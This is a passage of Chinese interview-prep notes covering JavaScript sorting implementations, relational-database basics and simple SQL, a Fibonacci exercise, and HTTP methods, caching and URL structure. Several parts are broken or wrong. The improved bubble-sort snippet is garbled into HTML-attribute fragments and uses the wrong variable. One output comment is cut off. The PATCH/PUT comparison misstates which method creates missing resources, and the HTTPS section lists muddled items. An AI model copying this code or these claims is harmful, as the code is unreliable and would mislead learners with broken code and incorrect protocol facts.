            }
            array[left] = key;
        }
        console.timeEnd('二分插入排序耗时：');

        return array;
    } else {
        return 'array is not an Array!';
    }
}
var arr=[3,44,38,5,47,15,36,26,27,2,46,4,19,50,48];
console.log(binaryInsertionSort(arr));//[2, 3, 4, 5, 15, 19, 26, 27, 36, 38, 44, 46, 47, 48, 50]
2.	堆排序
堆排序（Heap Sort）
堆排序可以说是一种利用堆的概念来排序的选择排序。
(1)算法简介
堆排序（Heapsort）是指利用堆这种数据结构所设计的一种排序算法。堆积是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。
(2)算法描述和实现
具体算法描述如下：
<1>.将初始待排序关键字序列(R1,R2….Rn)构建成大顶堆，此堆为初始的无序区； <2>.将堆顶元素R[1]与最后一个元素R[n]交换，此时得到新的无序区(R1,R2,……Rn-1)和新的有序区(Rn),且满足R[1,2…n-1]<=R[n]； <3>.由于交换后新的堆顶R[1]可能违反堆的性质，因此需要对当前无序区(R1,R2,……Rn-1)调整为新堆，然后再次将R[1]与无序区最后一个元素交换，得到新的无序区(R1,R2….Rn-2)和新的有序区(Rn-1,Rn)。不断重复此过程直到有序区的元素个数为n-1，则整个排序过程完成。
Javascript代码实现：
/*方法说明：堆排序
@param  array 待排序数组*/
function heapSort(array) {
    console.time('堆排序耗时');
    if (Object.prototype.toString.call(array).slice(8, -1) === 'Array') {
        //建堆
        var heapSize = array.length, temp;
        for (var i = Math.floor(heapSize / 2) - 1; i >= 0; i--) {
            heapify(array, i, heapSize);
        }

        //堆排序
        for (var j = heapSize - 1; j >= 1; j--) {
            temp = array[0];
            array[0] = array[j];
            array[j] = temp;
            heapify(array, 0, --heapSize);
        }
        console.timeEnd('堆排序耗时');
        return array;
    } else {
        return 'array is not an Array!';
    }
}
/*方法说明：维护堆的性质
@param  arr 数组
@param  x   数组下标
@param  len 堆大小*/
function heapify(arr, x, len) {
    if (Object.prototype.toString.call(arr).slice(8, -1) === 'Array' && typeof x === 'number') {
        var l = 2 * x + 1, r = 2 * x + 2, largest = x, temp;
        if (l < len && arr[l] > arr[largest]) {
            largest = l;
        }
        if (r < len && arr[r] > arr[largest]) {
            largest = r;
        }
        if (largest != x) {
            temp = arr[x];
            arr[x] = arr[largest];
            arr[largest] = temp;
            heapify(arr, largest, len);
        }
    } else {
        return 'arr is not an Array or x is not a number!';
    }
}
var arr=[91,60,96,13,35,65,46,65,10,30,20,31,77,81,22];
console.log(heapSort(arr));//[10, 13, 20, 22, 30, 31, 35, 46, 60, 65, 65, 77, 81, 91, 96]
3.	归并排序
归并排序（Merge Sort）
和选择排序一样，归并排序的性能不受输入数据的影响，但表现比选择排序好的多，因为始终都是O(n log n）的时间复杂度。代价是需要额外的内存空间。
(1)算法简介
　归并排序是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。归并排序是一种稳定的排序方法。将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序表，称为2-路归并。
(2)算法描述和实现
具体算法描述如下：
<1>.把长度为n的输入序列分成两个长度为n/2的子序列； <2>.对这两个子序列分别采用归并排序； <3>.将两个排序好的子序列合并成一个最终的排序序列。
Javscript代码实现:

function mergeSort(arr) {  //采用自上而下的递归方法
    var len = arr.length;
    if(len < 2) {
        return arr;
    }
    var middle = Math.floor(len / 2),
        left = arr.slice(0, middle),
        right = arr.slice(middle);
    return merge(mergeSort(left), mergeSort(right));
}

function merge(left, right)
{
    var result = [];
    console.time('归并排序耗时');
    while (left.length && right.length) {
        if (left[0] <= right[0]) {
            result.push(left.shift());
        } else {
            result.push(right.shift());
        }
    }

    while (left.length)
        result.push(left.shift());

    while (right.length)
        result.push(right.shift());
    console.timeEnd('归并排序耗时');
    return result;
}
var arr=[3,44,38,5,47,15,36,26,27,2,46,4,19,50,48];
console.log(mergeSort(arr));
4.基数排序
基数排序（Radix Sort）
基数排序也是非比较的排序算法，对每一位进行排序，从最低位开始排序，复杂度为O(kn),为数组长度，k为数组中的数的最大的位数；
(1)算法简介
基数排序是按照低位先排序，然后收集；再按照高位排序，然后再收集；依次类推，直到最高位。有时候有些属性是有优先级顺序的，先按低优先级排序，再按高优先级排序。最后的次序就是高优先级高的在前，高优先级相同的低优先级高的在前。基数排序基于分别排序，分别收集，所以是稳定的。
(2)算法描述和实现
具体算法描述如下：
<1>.取得数组中的最大数，并取得位数； <2>.arr为原始数组，从最低位开始取每个位组成radix数组； <3>.对radix进行计数排序（利用计数排序适用于小范围数的特点）；
Javascript代码实现：
/**
 * 基数排序适用于：
 *  (1)数据范围较小，建议在小于1000
 *  (2)每个数值都要大于等于0
 * @author xiazdong
 * @param  arr 待排序数组
 * @param  maxDigit 最大位数
 */
//LSD Radix Sort

function radixSort(arr, maxDigit) {
    var mod = 10;
    var dev = 1;
    var counter = [];
    console.time('基数排序耗时');
    for (var i = 0; i < maxDigit; i++, dev *= 10, mod *= 10) {
        for(var j = 0; j < arr.length; j++) {
            var bucket = parseInt((arr[j] % mod) / dev);
            if(counter[bucket]== null) {
                counter[bucket] = [];
            }
            counter[bucket].push(arr[j]);
        }
        var pos = 0;
        for(var j = 0; j < counter.length; j++) {
            var value = null;
            if(counter[j]!=null) {
                while ((value = counter[j].shift()) != null) {
                      arr[pos++] = value;
                }
          }
        }
    }
    console.timeEnd('基数排序耗时');
    return arr;
}
var arr = [3, 44, 38, 5, 47, 15, 36, 26, 27, 2, 46, 4, 19, 50, 48];
console.log(radixSort(arr,2)); //[2, 3, 4, 5, 15, 19, 26, 27, 36, 38, 44, 46, 47, 48, 50]
5.计数排序
计数排序（Counting Sort）
计数排序的核心在于将输入的数据值转化为键存储在额外开辟的数组空间中。 作为一种线性时间复杂度的排序，计数排序要求输入的数据必须是有确定范围的整数。
(1)算法简介
计数排序(Counting sort)是一种稳定的排序算法。计数排序使用一个额外的数组C，其中第i个元素是待排序数组A中值等于i的元素的个数。然后根据数组C来将A中的元素排到正确的位置。它只能对整数进行排序。
(2)算法描述和实现
具体算法描述如下：
<1>. 找出待排序的数组中最大和最小的元素； <2>. 统计数组中每个值为i的元素出现的次数，存入数组C的第i项； <3>. 对所有的计数累加（从C中的第一个元素开始，每一项和前一项相加）； <4>. 反向填充目标数组：将每个元素i放在新数组的第C(i)项，每放一个元素就将C(i)减去1。
Javascript代码实现：
function countingSort(array) {
    var len = array.length,
        B = [],
        C = [],
        min = max = array[0];
    console.time('计数排序耗时');
    for (var i = 0; i < len; i++) {
        min = min <= array[i] ? min : array[i];
        max = max >= array[i] ? max : array[i];
        C[array[i]] = C[array[i]] ? C[array[i]] + 1 : 1;
    }
    for (var j = min; j < max; j++) {
        C[j + 1] = (C[j + 1] || 0) + (C[j] || 0);
    }
    for (var k = len - 1; k >= 0; k--) {
        B[C[array[k]] - 1] = array[k];
        C[array[k]]--;
    }
    console.timeEnd('计数排序耗时');
    return B;
}
var arr = [2, 2, 3, 8, 7, 1, 2, 2, 2, 7, 3, 9, 8, 2, 1, 4, 2, 4, 6, 9, 2];
console.log(countingSort(arr)); //[1, 1, 2, 2, 2, 2, 2, 2, 2, 2, 3, 3, 4, 4, 6, 7, 7, 8, 8
6.快排
快速排序（Quick Sort）
快速排序的名字起的是简单粗暴，因为一听到这个名字你就知道它存在的意义，就是快，而且效率高! 它是处理大数据最快的排序算法之一了。
(1)算法简介
快速排序的基本思想：通过一趟排序将待排记录分隔成独立的两部分，其中一部分记录的关键字均比另一部分的关键字小，则可分别对这两部分记录继续进行排序，以达到整个序列有序。
(2)算法描述和实现
快速排序使用分治法来把一个串（list）分为两个子串（sub-lists）。具体算法描述如下：
<1>.从数列中挑出一个元素，称为 “基准”（pivot）； <2>.重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作； <3>.递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序。
Javascript代码实现：
/*方法说明：快速排序
@param  array 待排序数组*/
//方法一
function quickSort(array, left, right) {
    console.time('1.快速排序耗时');
    if (Object.prototype.toString.call(array).slice(8, -1) === 'Array' && typeof left === 'number' && typeof right === 'number') {
        if (left < right) {
            var x = array[right], i = left - 1, temp;
            for (var j = left; j <= right; j++) {
                if (array[j] <= x) {
                    i++;
                    temp = array[i];
                    array[i] = array[j];
                    array[j] = temp;
                }
            }
            quickSort(array, left, i - 1);
            quickSort(array, i + 1, right);
        }
        console.timeEnd('1.快速排序耗时');
        return array;
    } else {
        return 'array is not an Array or left or right is not a number!';
    }
}

//方法二
var quickSort2 = function(arr) {
    console.time('2.快速排序耗时');
　　if (arr.length <= 1) { return arr; }
　　var pivotIndex = Math.floor(arr.length / 2);
　　var pivot = arr.splice(pivotIndex, 1)[0];
　　var left = [];
　　var right = [];
　　for (var i = 0; i < arr.length; i++){
　　　　if (arr[i] < pivot) {
　　　　　　left.push(arr[i]);
　　　　} else {
　　　　　　right.push(arr[i]);
　　　　}
　　}
console.timeEnd('2.快速排序耗时');
　　return quickSort2(left).concat([pivot], quickSort2(right));
};

var arr=[3,44,38,5,47,15,36,26,27,2,46,4,19,50,48];
console.log(quickSort(arr,0,arr.length-1));//[2, 3, 4, 5, 15, 19, 26, 27, 36, 38, 44, 46, 47, 48, 50]
console.log(quickSort2(arr));//[2, 3, 4, 5, 15, 19, 26, 27, 36, 38, 44, 46, 47, 48, 50]
7.冒泡
l1.冒泡排序（Bubble Sort）
好的，开始总结第一个排序算法，冒泡排序。我想对于它每个学过C语言的都会了解的吧，这可能是很多人接触的第一个排序算法。
(1)算法描述
冒泡排序是一种简单的排序算法。它重复地走访过要排序的数列，一次比较两个元素，如果它们的顺序错误就把它们交换过来。走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端。
(2)算法描述和实现
具体算法描述如下：
<1>.比较相邻的元素。如果第一个比第二个大，就交换它们两个； <2>.对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对，这样在最后的元素应该会是最大的数； <3>.针对所有的元素重复以上的步骤，除了最后一个； <4>.重复步骤1~3，直到排序完成。
JavaScript代码实现：
function bubbleSort(arr) {
    var len = arr.length;
    for (var i = 0; i < len; i++) {
        for (var j = 0; j < len - 1 - i; j++) {
            if (arr[j] > arr[j+1]) {        //相邻元素两两对比
                var temp = arr[j+1];        //元素交换
                arr[j+1] = arr[j];
                arr[j] = temp;
            }
        }
    }
    return arr;
}
var arr=[3,44,38,5,47,15,36,26,27,2,46,4,19,50,48];
console.log(bubbleSort(arr));//[2, 3, 4, 5, 15, 19, 26, 27, 36, 38, 44, 46, 47, 48, 50]
改进冒泡排序： 设置一标志性变量pos,用于记录每趟排序中最后一次进行交换的位置。由于pos位置之后的记录均已交换到位,故在进行下一趟排序时只要扫描到pos位置即可。
改进后算法如下:
function bubbleSort2(arr) {
    console.time('改进后冒泡排序耗时');
    var i = arr.length-1;  //初始时,最后位置保持不变
    while (i>0) {
        var pos= 0; //每趟开始时,无记录交换
        for (var j= 0; j< i; j++)
            if (arr[j]> arr[j+1]) {
                pos= j; //记录交换的位置
                var tmp = arr[j]; arr[j]=arr[j+1];arr[j+1]=tmp;
            }
        i= pos; //为下一趟排序作准备
     }
     console.timeEnd('改进后冒泡排序耗时');
     return arr;
}
var arr=[3,44,38,5,47,15,36,26,27,2,46,4,19,50,48];
console.log(bubbleSort2(arr));//[2, 3, 4, 5, 15, 19, 26, 27, 36, 38, 44, 46, 47, 48, 50]
传统冒泡排序中每一趟排序操作只能找到一个最大值或最小值,我们考虑利用在每趟排序中进行正向和反向两遍冒泡的方法一次可以得到两个最终值(最大者和最小者) , 从而使排序趟数几乎减少了一半。
改进后的算法实现为:
function bubbleSort3(arr3) {
    var low = 0;
    var high= arr.length-1; //设置变量的初始值
    var tmp,j;
    console.time('2.改进后冒泡排序耗时');
    while (low < high) {
        for (j= low; j< high; ++j) //正向冒泡,找到最大者
            if (arr[j]> arr[j+1]) {
                tmp = arr[j]; arr[j]=arr[j+1];arr[j+1]=tmp;
            }
        --high;                 //修改high值, 前移一位
        for (j=high; j>low; --j) //反向冒泡,找到最小者
            if (arr[j]<arr[j-1]) arr="[3,44,38,5,47,15,36,26,27,2,46,4,19,50,48];" pre="" return="" tmp="arr[j];"var="">
8.希尔排序
希尔排序（Shell Sort）
1959年Shell发明； 第一个突破O(n^2)的排序算法；是简单插入排序的改进版；它与插入排序的不同之处在于，它会优先比较距离较远的元素。希尔排序又叫缩小增量排序
(1)算法简介
希尔排序的核心在于间隔序列的设定。既可以提前设定好间隔序列，也可以动态的定义间隔序列。动态定义间隔序列的算法是《算法（第4版》的合著者Robert Sedgewick提出的。
(2)算法描述和实现
先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，具体算法描述：
<1>. 选择一个增量序列t1，t2，…，tk，其中ti>tj，tk=1； <2>.按增量序列个数k，对序列进行k 趟排序； <3>.每趟排序，根据对应的增量ti，将待排序列分割成若干长度为m 的子序列，分别对各子表进行直接插入排序。仅增量因子为1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。
Javascript代码实现：
function shellSort(arr) {
    var len = arr.length,
        temp,
        gap = 1;
    console.time('希尔排序耗时:');
    while(gap < len/5) {          //动态定义间隔序列
        gap =gap*5+1;
    }
    for (gap; gap > 0; gap = Math.floor(gap/5)) {
        for (var i = gap; i < len; i++) {
            temp = arr[i];
            for (var j = i-gap; j >= 0 && arr[j] > temp; j-=gap) {
                arr[j+gap] = arr[j];
            }
            arr[j+gap] = temp;
        }
    }
    console.timeEnd('希尔排序耗时:');
    return arr;
}
var arr=[3,44,38,5,47,15,36,26,27,2,46,4,19,50,48];
console.log(shellSort(arr));//[2, 3, 4, 5, 15, 19, 26, 27, 36, 38, 44, 46, 47, 48, 50]
9.选择排序
.选择排序（Selection Sort）
表现最稳定的排序算法之一(这个稳定不是指算法层面上的稳定哈，相信聪明的你能明白我说的意思2333)，因为无论什么数据进去都是O(n2)的时间复杂度…..所以用到它的时候，数据规模越小越好。唯一的好处可能就是不占用额外的内存空间了吧。理论上讲，选择排序可能也是平时排序一般人想到的最多的排序方法了吧。
(1)算法简介
选择排序(Selection-sort)是一种简单直观的排序算法。它的工作原理：首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。
(2)算法描述和实现
n个记录的直接选择排序可经过n-1趟直接选择排序得到有序结果。具体算法描述如下：
<1>.初始状态：无序区为R[1..n]，有序区为空； <2>.第i趟排序(i=1,2,3…n-1)开始时，当前有序区和无序区分别为R[1..i-1]和R(i..n）。该趟排序从当前无序区中-选出关键字最小的记录 R[k]，将它与无序区的第1个记录R交换，使R[1..i]和R[i+1..n)分别变为记录个数增加1个的新有序区和记录个数减少1个的新无序区； <3>.n-1趟结束，数组有序化了。
Javascript代码实现:
function selectionSort(arr) {
    var len = arr.length;
    var minIndex, temp;
    console.time('选择排序耗时');
    for (var i = 0; i < len - 1; i++) {
        minIndex = i;
        for (var j = i + 1; j < len; j++) {
            if (arr[j] < arr[minIndex]) {     //寻找最小的数
                minIndex = j;                 //将最小数的索引保存
            }
        }
        temp = arr[i];
        arr[i] = arr[minIndex];
        arr[minIndex] = temp;
    }
    console.timeEnd('选择排序耗时');
    return arr;
}
var arr=[3,44,38,5,47,15,36,26,27,2,46,4,19,50,48];
console.log(selectionSort(arr));//[2, 3, 4, 5, 15, 19, 26, 27, 36, 38, 44, 46, 47, 48, 50]
10.桶排序
桶排序（Bucket Sort）
桶排序是计数排序的升级版。它利用了函数的映射关系，高效与否的关键就在于这个映射函数的确定。
(1)算法简介
桶排序 (Bucket sort)的工作的原理：假设输入数据服从均匀分布，将数据分到有限数量的桶里，每个桶再分别排序（有可能再使用别的排序算法或是以递归方式继续使用桶排序进行排
(2)算法描述和实现
具体算法描述如下：
<1>.设置一个定量的数组当作空桶； <2>.遍历输入数据，并且把数据一个一个放到对应的桶里去； <3>.对每个不是空的桶进行排序； <4>.从不是空的桶里把排好序的数据拼接起来。
Javascript代码实现:
/*方法说明：桶排序
@param  array 数组
@param  num   桶的数量*/
function bucketSort(array, num) {
    if (array.length <= 1) {
        return array;
    }
    var len = array.length, buckets = [], result = [], min = max = array[0], regex = '/^[1-9]+[0-9]*$/', space, n = 0;
    num = num || ((num > 1 && regex.test(num)) ? num : 10);
    console.time('桶排序耗时');
    for (var i = 1; i < len; i++) {
        min = min <= array[i] ? min : array[i];
        max = max >= array[i] ? max : array[i];
    }
    space = (max - min + 1) / num;
    for (var j = 0; j < len; j++) {
        var index = Math.floor((array[j] - min) / space);
        if (buckets[index]) {   //  非空桶，插入排序
            var k = buckets[index].length - 1;
            while (k >= 0 && buckets[index][k] > array[j]) {
                buckets[index][k + 1] = buckets[index][k];
                k--;
            }
            buckets[index][k + 1] = array[j];
        } else {    //空桶，初始化
            buckets[index] = [];
            buckets[index].push(array[j]);
        }
    }
    while (n < num) {
        result = result.concat(buckets[n]);
        n++;
    }
    console.timeEnd('桶排序耗时');
    return result;
}
var arr=[3,44,38,5,47,15,36,26,27,2,46,4,19,50,48];
console.log(bucketSort(arr,4));//[2, 3, 4, 5, 15, 19, 26, 27, 36, 38, 44, 46, 47, 48, 50]
16.数据库篇
1.数据模型

数据模型
•层次模型
•网状模型
•关系模型

层次模型

           层次模型是用树形结构来表示实体及其之间联系的模型，在这种模型中，数据被组织成由“根”开始的“树”，每个实体由根开始沿着不同的分支单线延伸，其结构如图15-1所示。树中的每一个节点代表实体型，连线则表示它们之间的关系。其特点是：有且只有一个节点无父节点，此节点即为根节点；其他节点有且只有一个父结点，其适合表示一对多的联系。

网状模型

          网状数据模型是用以实体型为节点的有向图表示各实体及其之间的联系的模型，其可以有一个以上的节点无父节点，适合用于表示多对多的联系。

关系模型

          关系模型是用二维表格来表示实体及其相互关系的模型，关系模型将信息存储在由行和列组成的表中，其形式就像电子表格的行和列。关系模型与层次模型和网状模型相比有着本质的差别，

2.数据库键

键的选用

主键

组合键

候选键

外键

主键

      主键（Primary Key）是能辨识记录的最小字段组，换句话说就是表的最小原子Key。例如在客户表中，每一条客户数据有其个别的客户代号，通过客户代号的内容，就可以直接找到唯一的一条客户记录，故客户代号可以是客户表的主键。被设为Primary Key的字段，其内容值必须具有唯一性且不能是空白。其形式如图15-7所示。

组合键

            组合键（Concatenated Key）是指没有一个适合做主键的字段时，选择由一个以上的字段组合而成的主键，称为组合键，其对应形式如图15-8所示。

候选键

           候选键（Condidate Key）是指同时拥有两个或两个以上可作为主键的字段，这些有资格成为主键的字段，便成为这个表的候选键。调用时，根据不同的情况从候选键中挑出一个主键。其对应形式如图15-9所示。

外键

          外键（Foreign Key）指表中字段是其他表的主键，这个字段称为外键，如果其他表的主键是组合键，那么外键也必须是同样的字段组合，与主键一一对应。其对应形式如图15-10、图15-11所示。
3.db
选择：select * from table1 where 范围
插入：insert into table1(field1,field2) values(value1,value2)
删除：delete from table1 where 范围
更新：update table1 set field1=value1 where 范围
查找：select * from table1 where field1 like ’%value1%’


关联类型
•一对一关系
•一对多关系
•多对多关系

关系数据库
•关系数据库基本概念
•关系的基本特点
•数据的表示方法

关系数据库基本概念

          关系是一个带有一些特殊属性的表，这个表就称为关系表，表以行和列的形式存储数据，而一组表组成了数据库。表都由行和列组成，而一个关系型表要具有行和列，其列又称为属性，行又称为元组。其结构形式如图15-4所示。属性的取值范围称为域，其类型和范围具体由属性的性质及其所表示的意义来确定。

关系的基本特点

    在关系模型中，关系具有以下基本特点：

数据的表示方法

           关系型系统必须符合数据库以表类型提供用户的需求，这里的表是关系型系统的逻辑结构，而非实体结构。实际上在实体层中，系统可以使用任何的一般存储结构，如循序文件、索引、链接等。而在逻辑层中，则将这些实体层结构进行对应，并建立成表，其表的数据存储格式如表15-1所示。


17.算法练习（斐波那契数列）
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Document</title>
</head>
<body>
  <script>
    function getNthFibonacci(count){
    	var arr = [1,1];
    	for(var i = 0;i<arr.length;i++){
    		var param = arr[i] +arr[i+1];
    		arr.push(param);
    		if(count == 0 || count == 1){
	    		console.log(arr[count]);
	    		break;
    		};
    		if(arr.length == count+1){
    			console.log(arr[count]);
    			break;
    		}
    	}
	}
	getNthFibonacci(5);
  </script>
</body>
</html>

18.网络篇
1.HTTP所有请求头及原理
HTTP/1.1协议中共定义了8种HTTP请求方法，HTTP请求方法也被叫做“请求动作”，不同的方法规定了不同的操作指定的资源方式。服务端也会根据不同的请求方法做不同的响应。

GET
GET请求会显示请求指定的资源。一般来说GET方法应该只用于数据的读取，而不应当用于会产生副作用的非幂等的操作中。
GET会方法请求指定的页面信息，并返回响应主体，GET被认为是不安全的方法，因为GET方法会被网络蜘蛛等任意的访问。

HEAD
HEAD方法与GET方法一样，都是向服务器发出指定资源的请求。但是，服务器在响应HEAD请求时不会回传资源的内容部分，即：响应主体。这样，我们可以不传输全部内容的情况下，就可以获取服务器的响应头信息。HEAD方法常被用于客户端查看服务器的性能。

POST
POST请求会 向指定资源提交数据，请求服务器进行处理，如：表单数据提交、文件上传等，请求数据会被包含在请求体中。POST方法是非幂等的方法，因为这个请求可能会创建新的资源或/和修改现有资源。

PUT
PUT请求会身向指定资源位置上传其最新内容，PUT方法是幂等的方法。通过该方法客户端可以将指定资源的最新数据传送给服务器取代指定的资源的内容。

DELETE
DELETE请求用于请求服务器删除所请求URI（统一资源标识符，Uniform Resource Identifier）所标识的资源。DELETE请求后指定资源会被删除，DELETE方法也是幂等的。

CONNECT
CONNECT方法是HTTP/1.1协议预留的，能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接与非加密的HTTP代理服务器的通信。

OPTIONS
OPTIONS请求与HEAD类似，一般也是用于客户端查看服务器的性能。 这个方法会请求服务器返回该资源所支持的所有HTTP请求方法，该方法会用'*'来代替资源名称，向服务器发送OPTIONS请求，可以测试服务器功能是否正常。JavaScript的XMLHttpRequest对象进行CORS跨域资源共享时，就是使用OPTIONS方法发送嗅探请求，以判断是否有对指定资源的访问权限。 允许

TRACE
TRACE请求服务器回显其收到的请求信息，该方法主要用于HTTP请求的测试或诊断。

HTTP/1.1之后增加的方法
在HTTP/1.1标准制定之后，又陆续扩展了一些方法。其中使用中较多的是 PATCH 方法：
PATCH
PATCH方法出现的较晚，它在2010年的RFC 5789标准中被定义。PATCH请求与PUT请求类似，同样用于资源的更新。二者有以下两点不同：
•但PATCH一般用于资源的部分更新，而PUT一般用于资源的整体更新。
•当资源不存在时，PATCH会创建一个新的资源，而PUT只会对已在资源进行更新。
2.什么是Etag？

    当发送一个服务器请求时，浏览器首先会进行缓存过期判断。浏览器根据缓存过期时间判断缓存文件是否过期。

    情景一：若没有过期，则不向服务器发送请求，直接使用缓存中的结果，此时我们在浏览器控制台中可以看到 200 OK(from cache) ，此时的情况就是完全使用缓存，浏览器和服务器没有任何交互的。

    情景二：若已过期，则向服务器发送请求，此时请求中会带上①中设置的文件修改时间，和Etag

    然后，进行资源更新判断。服务器根据浏览器传过来的文件修改时间，判断自浏览器上一次请求之后，文件是不是没有被修改过；根据Etag，判断文件内容自上一次请求之后，有没有发生变化

    情形一：若两种判断的结论都是文件没有被修改过，则服务器就不给浏览器发index.html的内容了，直接告诉它，文件没有被修改过，你用你那边的缓存吧—— 304 Not Modified，此时浏览器就会从本地缓存中获取index.html的内容。此时的情况叫协议缓存，浏览器和服务器之间有一次请求交互。

    情形二：若修改时间和文件内容判断有任意一个没有通过，则服务器会受理此次请求，之后的操作同①


①	 只有get请求会被缓存，post请求不会

3.expires cache-control https
HTTP和HTTPS

    HTTP协议通常承载于TCP协议之上，在HTTP和TCP之间添加一个安全协议层（SSL或TSL），这个时候，就成了我们常说的HTTPS。

    默认HTTP的端口号为80，HTTPS的端口号为443。
    为什么HTTPS安全

    因为网络请求需要中间有很多的服务器路由器的转发。中间的节点都可能篡改信息，而如果使用HTTPS，密钥在你和终点站才有。https之所以比http安全，是因为他利用ssl/tls协议传输。它包含证书，卸载，流量转发，负载均衡，页面适配，浏览器适配，refer传递等。保障了传输过程的安全性


    Expires和Cache-Control

Expires要求客户端和服务端的时钟严格同步。HTTP1.1引入Cache-Control来克服Expires头的限制。如果max-age和Expires同时出现，则max-age有更高的优先级。

    Cache-Control: no-cache, private, max-age=0

    ETag: abcde

    Expires: Thu, 15 Apr 2014 20:00:00 GMT

    Pragma: private

Last-Modified: $now // RFC1123 format
4.HTTP简介
HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。
HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。
HTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。
HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。


主要特点
1、简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。
2、灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。
3.无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。
4.无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。
5、支持B/S及C/S模式。
HTTP之URL
HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息
URL,全称是UniformResourceLocator, 中文叫统一资源定位符,是互联网上用来标识某一处资源的地址。以下面这个URL为例，介绍下普通URL的各部分组成：
从上面的URL可以看出，一个完整的URL包括以下几部分：
1.协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在"HTTP"后面的“//”为分隔符
2.域名部分：该URL的域名部分为“www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用
3.端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口
4.虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分。虚拟目录也不是一个URL必须的部分。本例中的虚拟目录是“/news/”
5.文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.asp”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名
6.锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分
7.参数部分：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。本例中的参数部分为“boardID=5&ID=24618&page=1”。参数可以允许有多个参数，参数与参数之间用“&”作为分隔符。
URI和URL的区别
URI，是uniform resource identifier，统一资源标识符，用来唯一的标识一个资源。
Web上可用的每种资源如HTML文档、图像、视频片段、程序等都是一个来URI来定位的
URI一般由三部组成：
①访问资源的命名机制
②存放资源的主机名
③资源自身的名称，由路径表示，着重强调于资源。
URL是uniform resource locator，统一资源定位器，它是一种具体的URI，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。
URL是Internet上用来描述信息资源的字符串，主要用在各种WWW客户程序和服务器程序上，特别是著名的Mosaic。
采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。URL一般由三部组成：
①协议(或称为服务方式)
②存有该资源的主机IP地址(有时也包括端口号)
③主机资源的具体地址。如目录和文件名等
URN，uniform resource name，统一资源命名，是通过名字来标识资源，比如mailto:java-net@java.sun.com。
URI是以一种抽象的，高层次概念定义统一资源标识，而URL和URN则是具体的资源标识的方式。URL和URN都是一种URI。笼统地说，每个 URL 都是 URI，但不一定每个 URI 都是 URL。这是因为 URI 还包括一个子类，即统一资源名称 (URN)，它命名资源但不指定如何定位资源。上面的 mailto、news 和 isbn URI 都是 URN 的示例。
在Java的URI中，一个URI实例可以代表绝对的，也可以是相对的，只要它符合URI的语法规则。而URL类则不仅符合语义，还包含了定位该资源的信息，因此它不能是相对的。
在Java类库中，URI类不包含任何访问资源的方法，它唯一的作用就是解析。
相反的是，URL类可以打开一个到达资源的流。
HTTP之请求消息Request
客户端发送一个HTTP请求到服务器的请求消息包括以下格式：
请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。
请求行以一个方法符号开头，以空格分开，后面跟着请求的URI和协议的版本。
Get请求例子，使用Charles抓取的request：
GET /562f25980001b1b106000338.jpg HTTP/1.1
Host    img.mukewang.com
User-Agent    Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36
Accept    image/webp,image/*,*/*;q=0.8
Referer    http://www.imooc.com/
Accept-Encoding    gzip, deflate, sdch
Accept-Language    zh-CN,zh;q=0.8
